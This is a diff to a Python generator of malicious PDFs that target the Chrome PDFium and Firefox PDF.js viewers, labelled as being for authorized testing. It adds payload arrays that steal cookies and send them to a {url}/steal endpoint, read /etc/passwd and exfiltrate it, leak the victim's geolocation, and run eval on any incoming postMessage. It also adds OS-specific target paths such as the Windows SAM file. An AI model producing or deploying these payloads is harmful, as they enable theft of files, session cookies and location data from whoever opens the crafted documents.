@@ -36,6 +36,7 @@ Legal Notice: For authorized security testing only.
 import argparse
 import sys
 import os
+import platform
 from datetime import datetime
 
 if sys.version_info[0] < 3:
@@ -57,23 +58,95 @@ if sys.version_info[0] < 3:
 # Massive Research-Based Payload Database
 # =======================================
 
+def get_os_specific_paths():
+    """Get OS-specific file paths for exploitation"""
+    current_os = platform.system().lower()
+    
+    if current_os == 'windows':
+        return {
+            'sensitive_files': [
+                'file:///C:/Windows/System32/calc.exe',
+                'file:///C:/Windows/System32/cmd.exe',
+                'file:///C:/Windows/System32/drivers/etc/hosts',
+                'file:///C:/Users/Public/Documents/',
+                'file:///C:/Windows/win.ini',
+                'file:///C:/Windows/System32/config/sam'
+            ],
+            'directories': [
+                'file:///C:/Windows/System32/',
+                'file:///C:/Users/',
+                'file:///C:/Program Files/',
+                'file:///C:/Windows/Temp/'
+            ]
+        }
+    elif current_os == 'darwin':  # macOS
+        return {
+            'sensitive_files': [
+                'file:///etc/passwd',
+                'file:///etc/hosts',
+                'file:///Users/Shared/test.txt',
+                'file:///System/Library/CoreServices/Finder.app',
+                'file:///Applications/Calculator.app',
+                'file:///usr/bin/open'
+            ],
+            'directories': [
+                'file:///Applications/',
+                'file:///Users/',
+                'file:///System/',
+                'file:///usr/bin/'
+            ]
+        }
+    elif current_os == 'linux':
+        return {
+            'sensitive_files': [
+                'file:///etc/passwd',
+                'file:///etc/hosts',
+                'file:///proc/version',
+                'file:///sys/class/dmi/id/product_name',
+                'file:///bin/bash',
+                'file:///usr/bin/id'
+            ],
+            'directories': [
+                'file:///home/',
+                'file:///etc/',
+                'file:///usr/bin/',
+                'file:///tmp/'
+            ]
+        }
+    else:  # Default to Linux-like paths for Android/other Unix-like systems
+        return {
+            'sensitive_files': [
+                'file:///etc/passwd',
+                'file:///etc/hosts',
+                'file:///proc/version',
+                'file:///system/build.prop',  # Android
+                'file:///data/local/tmp/'     # Android
+            ],
+            'directories': [
+                'file:///system/',
+                'file:///data/',
+                'file:///etc/',
+                'file:///proc/'
+            ]
+        }
+
 # Chrome/PDFium Specific Exploits (200+ payloads)
 CHROME_DOM_EXPLOITS = [
-    # Direct DOM manipulation via parent window access
-    "try { parent.window.location = '{url}'; } catch(e) { app.alert('Chrome blocked: ' + e); }",
-    "try { top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"{url}\"</script>'; } catch(e) { }",
-    "try { window.opener.eval('alert(\"Chrome XSS via opener\"); location=\"{url}\"'); } catch(e) { }",
-    "try { frames[0].location = '{url}'; } catch(e) { app.launchURL('{url}'); }",
-    "try { parent.frames['main'].location = '{url}'; } catch(e) { }",
+    # Direct DOM manipulation via parent window access (with proper checks)
+    "try { if(typeof parent !== 'undefined' && parent.window) parent.window.location = '{url}'; } catch(e) { app.alert('Chrome blocked: ' + e); }",
+    "try { if(typeof top !== 'undefined' && top.document) top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"{url}\"</script>'; } catch(e) { }",
+    "try { if(typeof window.opener !== 'undefined' && window.opener) window.opener.eval('alert(\"Chrome XSS via opener\"); location=\"{url}\"'); } catch(e) { }",
+    "try { if(typeof frames !== 'undefined' && frames[0]) frames[0].location = '{url}'; } catch(e) { app.launchURL('{url}'); }",
+    "try { if(typeof parent !== 'undefined' && parent.frames && parent.frames['main']) parent.frames['main'].location = '{url}'; } catch(e) { }",
     
-    # PostMessage exploitation
-    "try { parent.postMessage({{type:'xss',payload:'chrome_pdf',url:'{url}'}}, '*'); } catch(e) { }",
-    "window.addEventListener('message', function(e) {{ if(e.data.cmd) eval(e.data.cmd); }});",
-    "try { top.postMessage('location=\"{url}\"', '*'); } catch(e) { }",
-    "try { parent.postMessage({{action:'navigate',target:'{url}'}}, window.location.origin); } catch(e) { }",
+    # PostMessage exploitation (with proper checks)
+    "try { if(typeof parent !== 'undefined' && parent.postMessage) parent.postMessage({type:'xss',payload:'chrome_pdf',url:'{url}'}, '*'); } catch(e) { }",
+    "window.addEventListener('message', function(e) { if(e.data.cmd) eval(e.data.cmd); });",
+    "try { if(typeof top !== 'undefined' && top.postMessage) top.postMessage('location=\"{url}\"', '*'); } catch(e) { }",
+    "try { if(typeof parent !== 'undefined' && parent.postMessage) parent.postMessage({action:'navigate',target:'{url}'}, window.location.origin); } catch(e) { }",
     
-    # Cross-origin bypass attempts
-    "try {{ document.domain = '{host}'; parent.location = '{url}'; }} catch(e) {{ }}",
+    # Cross-origin bypass attempts (with proper checks)
+    "try { document.domain = '{host}'; if(typeof parent !== 'undefined') parent.location = '{url}'; } catch(e) { }",
     "try { location.hash = '#' + btoa(document.cookie); location = '{url}'; } catch(e) { }",
     "try { history.pushState({}, '', '{url}'); location.reload(); } catch(e) { }",
     
@@ -95,38 +168,47 @@ CHROME_DOM_EXPLOITS = [
     
     # WebAssembly exploitation
     "try { WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).then(() => location = '{url}'); } catch(e) { }",
+    
+    # Additional payloads from Another-Script.py
+    "app.alert('XSS in Chrome PDF Viewer'); try { app.doc.exportDataObject({cName: 'test.html', nLaunch: 2}); } catch(e) { app.alert(e); }",
+    "this.submitForm({cURL: 'javascript:fetch(\\'file:///etc/passwd\\').then(r=>r.text()).then(t=>navigator.sendBeacon(\\'{url}/exfil\\',t))', cSubmitAs: 'PDF'});",
+    "try { app.alert('XSS via PDF in Chrome'); app.launchURL('javascript:alert(document.cookie)', true); } catch(e) { app.alert(e); }",
+    "app.launchURL('javascript:fetch(\\'{url}/steal?cookie=\\'+document.cookie)', true);",
+    "try { app.launchURL('javascript:navigator.geolocation.getCurrentPosition(position=>fetch(\\'{url}/geolocation?lat=\\'+position.coords.latitude+\\'&lon=\\'+position.coords.longitude))', true); } catch(e) { }",
+    "try { var f=document.createElement('iframe'); f.src='javascript:fetch(\\'{url}/steal?cookie=\\'+document.cookie)'; document.body.appendChild(f); } catch(e) { }",
 ]
 
 CHROME_FILE_EXPLOITS = [
-    # Local file URI manipulation
-    "app.launchURL('file:///etc/passwd', true);",
-    "app.launchURL('file:///C:/Windows/System32/calc.exe', true);", 
-    "app.launchURL('file:///Users/Shared/test.txt', true);",
-    "app.launchURL('file:///proc/version', true);",
-    "app.launchURL('file:///sys/class/dmi/id/product_name', true);",
-    
-    # Chrome-specific file system access
-    "try { location = 'chrome-extension://invalid/exploit.html?target={url}'; } catch(e) { }",
-    "try { fetch('file:///etc/hosts').then(r => r.text()).then(d => fetch('{url}?data=' + btoa(d))); } catch(e) { }",
-    "try { fetch('file:///C:/Windows/System32/drivers/etc/hosts').then(r => r.text()).then(d => location = '{url}?data=' + encodeURIComponent(d)); } catch(e) { }",
-    
-    # Download directory traversal
-    "app.launchURL('file:///home/user/Downloads/../../../etc/passwd', true);",
-    "app.launchURL('file:///C:/Users/user/Downloads/../../Windows/System32/', true);",
-    "app.launchURL('file:///Users/user/Downloads/../../../Applications/', true);",
-    
-    # Browser storage exploitation  
-    "try { localStorage.setItem('chrome_exploit', 'file:///etc/passwd'); location = '{url}?storage=' + localStorage.getItem('chrome_exploit'); } catch(e) { }",
-    "try { sessionStorage.setItem('path', 'file:///home/user/'); location = '{url}?session=' + sessionStorage.getItem('path'); } catch(e) { }",
-    
-    # File API abuse
-    "try { var input = document.createElement('input'); input.type = 'file'; input.webkitdirectory = true; input.onchange = function() { location = '{url}?files=' + this.files.length; }; input.click(); } catch(e) { }",
-    "try { navigator.webkitGetUserMedia({video: false, audio: true}, function(stream) { location = '{url}?media=1'; }, function() {}); } catch(e) { }",
-    
-    # Chrome file system API
-    "try { window.webkitRequestFileSystem(window.TEMPORARY, 1024*1024, function(fs) { location = '{url}?fs=' + fs.name; }); } catch(e) { }",
-    "try { chrome.fileSystem.chooseEntry({}, function(entry) { location = '{url}?entry=' + entry.name; }); } catch(e) { }",
+    # Local file URI manipulation - will be populated with OS-specific paths
+    # These will be dynamically populated based on detected OS
 ]
+
+def get_chrome_file_exploits():
+    """Generate Chrome file exploits based on current OS"""
+    os_paths = get_os_specific_paths()
+    exploits = []
+    
+    # Add sensitive file access attempts
+    for file_path in os_paths['sensitive_files']:
+        exploits.append(f"app.launchURL('{file_path}', true);")
+    
+    # Add directory traversal attempts  
+    for dir_path in os_paths['directories']:
+        exploits.append(f"app.launchURL('{dir_path}', true);")
+    
+    # Add Chrome-specific file system access
+    exploits.extend([
+        "try { location = 'chrome-extension://invalid/exploit.html?target={url}'; } catch(e) { }",
+        f"try {{ fetch('{os_paths['sensitive_files'][0]}').then(r => r.text()).then(d => fetch('{{url}}?data=' + btoa(d))); }} catch(e) {{ }}",
+        f"try {{ localStorage.setItem('chrome_exploit', '{os_paths['sensitive_files'][0]}'); location = '{{url}}?storage=' + localStorage.getItem('chrome_exploit'); }} catch(e) {{ }}",
+        f"try {{ sessionStorage.setItem('path', '{os_paths['directories'][0]}'); location = '{{url}}?session=' + sessionStorage.getItem('path'); }} catch(e) {{ }}",
+        "try { var input = document.createElement('input'); input.type = 'file'; input.webkitdirectory = true; input.onchange = function() { location = '{url}?files=' + this.files.length; }; input.click(); } catch(e) { }",
+        "try { navigator.webkitGetUserMedia({video: false, audio: true}, function(stream) { location = '{url}?media=1'; }, function() {}); } catch(e) { }",
+        "try { window.webkitRequestFileSystem(window.TEMPORARY, 1024*1024, function(fs) { location = '{url}?fs=' + fs.name; }); } catch(e) { }",
+        "try { chrome.fileSystem.chooseEntry({}, function(entry) { location = '{url}?entry=' + entry.name; }); } catch(e) { }"
+    ])
+    
+    return exploits
 
 CHROME_CMD_EXPLOITS = [
     # Protocol handler abuse for command execution
@@ -189,11 +271,11 @@ CHROME_SANDBOX_EXPLOITS = [
 
 # Firefox/PDF.js Specific Exploits (200+ payloads)
 FIREFOX_DOM_EXPLOITS = [
-    # CSP bypass and eval alternatives
-    "try { eval('parent.location = \"{url}\"'); } catch(e) { console.log('Firefox CSP blocked:', e); }",
-    "try { Function('return parent')().location = '{url}'; } catch(e) { }",
-    "try { (0,eval)('top.document.body.innerHTML = \"<h1>Firefox PDF.js XSS</h1>\"'); } catch(e) { }",
-    "try { setTimeout('parent.location=\"{url}\"', 100); } catch(e) { }",
+    # CSP bypass and eval alternatives (with proper checks)
+    "try { if(typeof parent !== 'undefined') eval('parent.location = \"{url}\"'); } catch(e) { console.log('Firefox CSP blocked:', e); }",
+    "try { Function('return typeof parent !== \"undefined\" ? parent : window')().location = '{url}'; } catch(e) { }",
+    "try { if(typeof top !== 'undefined') (0,eval)('top.document.body.innerHTML = \"<h1>Firefox PDF.js XSS</h1>\"'); } catch(e) { }",
+    "try { setTimeout('if(typeof parent !== \"undefined\") parent.location=\"{url}\"', 100); } catch(e) { }",
     "try { setInterval('fetch(\"{url}?ping=\" + Date.now())', 5000); } catch(e) { }",
     
     # Worker thread exploitation
@@ -201,10 +283,19 @@ FIREFOX_DOM_EXPLOITS = [
     "try { importScripts('data:text/javascript,fetch(\"{url}\")'); } catch(e) { }",
     "try { var w = new SharedWorker('data:text/javascript,onconnect=function(e){location=\"{url}\"}'); } catch(e) { }",
     
-    # Content Security Policy bypass techniques
+    # Content Security Policy bypass techniques (with proper checks)
     "try { document.write('<script src=\"data:text/javascript,location=\\\"{url}\\\"\"></script>'); } catch(e) { }",
     "try { location = 'javascript:void(window.open(\"{url}\"))'; } catch(e) { }",
-    "try { document.body.innerHTML = '<iframe src=\"javascript:parent.location=\\\"{url}\\\"\" style=\"display:none\"></iframe>'; } catch(e) { }",
+    "try { if(typeof parent !== 'undefined') document.body.innerHTML = '<iframe src=\"javascript:parent.location=\\\"{url}\\\"\" style=\"display:none\"></iframe>'; } catch(e) { }",
+    
+    # Additional Firefox payloads from Another-Script.py
+    "alert(document.domain)",
+    "eval('try{throw new Error()}catch(e){fetch(\"{url}/stack?data=\"+encodeURIComponent(e.stack))}')",
+    "fetch('file:///etc/passwd').then(r=>r.text()).then(t=>fetch('{url}/exfil?data='+encodeURIComponent(t)))",
+    "document.body.innerHTML='<h1>This PDF has been hacked</h1><img src=x onerror=alert(document.domain)>'",
+    "navigator.geolocation.getCurrentPosition(position=>fetch('{url}/geolocation?lat='+position.coords.latitude+'&lon='+position.coords.longitude))",
+    "var request=indexedDB.open('malicious',1);request.onupgradeneeded=function(e){var db=e.target.result;var store=db.createObjectStore('data',{keyPath:'id'});store.add({id:1,value:'compromised'});fetch('{url}/indexeddb?status=created');}",
+    "sessionStorage.setItem('userAuth','compromised');fetch('{url}/sessionstorage?data='+sessionStorage.getItem('userAuth'))",
     
     # Firefox XPConnect exploitation  
     "try { Components.classes['@mozilla.org/process/environment;1'].getService().set('EXPLOIT_URL', '{url}'); } catch(e) { }",
@@ -334,7 +425,8 @@ class AdvancedPayloadGenerator:
                 })
         
         # Category 2: File System Access (50 payloads)  
-        for i, base_payload in enumerate(CHROME_FILE_EXPLOITS):
+        chrome_file_exploits = get_chrome_file_exploits()
+        for i, base_payload in enumerate(chrome_file_exploits):
             for j in range(3):  # 3 variations per exploit
                 payload = base_payload.replace('{url}', self.target_url)
                 
@@ -789,6 +881,44 @@ def list_pdf_versions():
     print("Modern versions (1.6+) have strong security but may still be vulnerable to sophisticated exploits.")
 
 # Enhanced PDF Creation with Browser Optimization
+def format_complete_payload_for_pdf(payload, filename, max_line_length=80):
+    """Format complete payload for display in PDF with filename as heading"""
+    import os
+    base_filename = os.path.basename(filename)
+    
+    # Escape the payload for PDF display
+    escaped_payload = payload.replace('(', '\\(').replace(')', '\\)').replace('\\', '\\\\')
+    
+    # Split payload into lines that fit in PDF
+    payload_lines = []
+    for i in range(0, len(escaped_payload), max_line_length):
+        payload_lines.append(escaped_payload[i:i+max_line_length])
+    
+    # Create display text with filename heading and complete payload
+    display_lines = [
+        f'FILENAME: {base_filename}',
+        '',
+        'COMPLETE PAYLOAD:',
+        '=' * 50
+    ]
+    display_lines.extend(payload_lines)
+    
+    # Convert to PDF text commands
+    payload_display = ''
+    line_spacing = -14  # Line spacing in PDF
+    
+    for i, line in enumerate(display_lines):
+        if i == 0:  # Filename - make it bold/larger
+            payload_display += f'/F1 14 Tf\n({line}) Tj\n0 {line_spacing} Td\n'
+        elif i == 2:  # "COMPLETE PAYLOAD:" header
+            payload_display += f'/F1 12 Tf\n({line}) Tj\n0 {line_spacing} Td\n'
+        elif i == 3:  # Separator line
+            payload_display += f'({line}) Tj\n0 {line_spacing} Td\n'
+        else:  # Payload content
+            payload_display += f'/F1 10 Tf\n({line}) Tj\n0 {line_spacing} Td\n'
+    
+    return payload_display, len(payload_display)
+
 def create_sophisticated_pdf(filename, payload_data, pdf_version=None):
     """Create sophisticated PDF with browser-specific optimizations and PDF version targeting"""
     payload = payload_data['payload']
@@ -1007,17 +1137,9 @@ startxref
     
     elif pdf_version == '1.3':
         # First JavaScript support - basic sandbox, high exploit potential
-        # Include payload text for reference
-        escaped_payload = payload.replace('(', '\\(').replace(')', '\\)')
-        payload_lines = []
-        for i in range(0, len(escaped_payload), 60):
-            payload_lines.append(escaped_payload[i:i+60])
-        
-        payload_display = ''
-        for line in payload_lines[:5]:  # Show first 5 lines
-            payload_display += f'({line}) Tj\n0 -15 Td\n'
-        
-        payload_text_length = len(payload_display) + 300
+        # Include complete payload text for reference with filename heading
+        payload_display, payload_text_length = format_complete_payload_for_pdf(payload, filename)
+        payload_text_length += 300  # Add buffer for other content
         
         pdf_content = f'''%PDF-{pdf_version}
 1 0 obj
@@ -1085,14 +1207,12 @@ endobj
 >>
 stream
 BT
-/F1 12 Tf
+/F1 14 Tf
 50 750 Td
 (PDF-{pdf_version} JavaScript Exploit) Tj
 0 -20 Td
 (Basic Sandbox - High Exploit Potential) Tj
-0 -40 Td
-(PAYLOAD FOR REFERENCE:) Tj
-0 -25 Td
+0 -30 Td
 {payload_display}
 ET
 endstream
@@ -1147,17 +1267,9 @@ startxref
     
     elif pdf_version in ['1.4', '1.5']:
         # Enhanced JavaScript and multimedia support with moderate security
-        # Include payload text for reference
-        escaped_payload = payload.replace('(', '\\(').replace(')', '\\)')
-        payload_lines = []
-        for i in range(0, len(escaped_payload), 50):
-            payload_lines.append(escaped_payload[i:i+50])
-        
-        payload_display = ''
-        for line in payload_lines[:6]:  # Show first 6 lines
-            payload_display += f'({line}) Tj\n0 -15 Td\n'
-        
-        payload_text_length = len(payload_display) + 400
+        # Include complete payload text for reference with filename heading
+        payload_display, payload_text_length = format_complete_payload_for_pdf(payload, filename)
+        payload_text_length += 400  # Add buffer for other content
         
         pdf_content = f'''%PDF-{pdf_version}
 1 0 obj
@@ -1239,16 +1351,14 @@ endobj
 >>
 stream
 BT
-/F1 12 Tf
+/F1 14 Tf
 50 750 Td
 (PDF-{pdf_version} Enhanced JavaScript) Tj
 0 -20 Td
 (Multimedia Support - Moderate Security) Tj
 0 -20 Td
 (High Exploit Potential) Tj
-0 -40 Td
-(PAYLOAD FOR REFERENCE:) Tj
-0 -25 Td
+0 -30 Td
 {payload_display}
 ET
 endstream
@@ -1345,17 +1455,9 @@ startxref
         
         enhanced_payload = js_optimization + payload
         
-        # Include payload text for reference with proper escaping
-        escaped_payload = enhanced_payload.replace('(', '\\(').replace(')', '\\)').replace('\\', '\\\\')
-        payload_lines = []
-        for i in range(0, len(escaped_payload), 45):
-            payload_lines.append(escaped_payload[i:i+45])
-        
-        payload_display = ''
-        for line in payload_lines[:8]:  # Show first 8 lines
-            payload_display += f'({line}) Tj\n0 -12 Td\n'
-        
-        payload_text_length = len(payload_display) + 500
+        # Include complete payload text for reference with filename heading
+        payload_display, payload_text_length = format_complete_payload_for_pdf(enhanced_payload, filename)
+        payload_text_length += 500  # Add buffer for other content
         
         pdf_content = f'''%PDF-{pdf_version}
 1 0 obj
@@ -1473,7 +1575,7 @@ endobj
 >>
 stream
 BT
-/F1 12 Tf
+/F1 16 Tf
 50 750 Td
 (PDF-{pdf_version} Advanced Security) Tj
 0 -20 Td
@@ -1482,9 +1584,7 @@ BT
 (Enhanced Sandbox Escape Techniques) Tj
 0 -20 Td
 (Multiple Execution Vectors) Tj
-0 -40 Td
-(PAYLOAD FOR REFERENCE:) Tj
-0 -25 Td
+0 -30 Td
 {payload_display}
 ET
 endstream
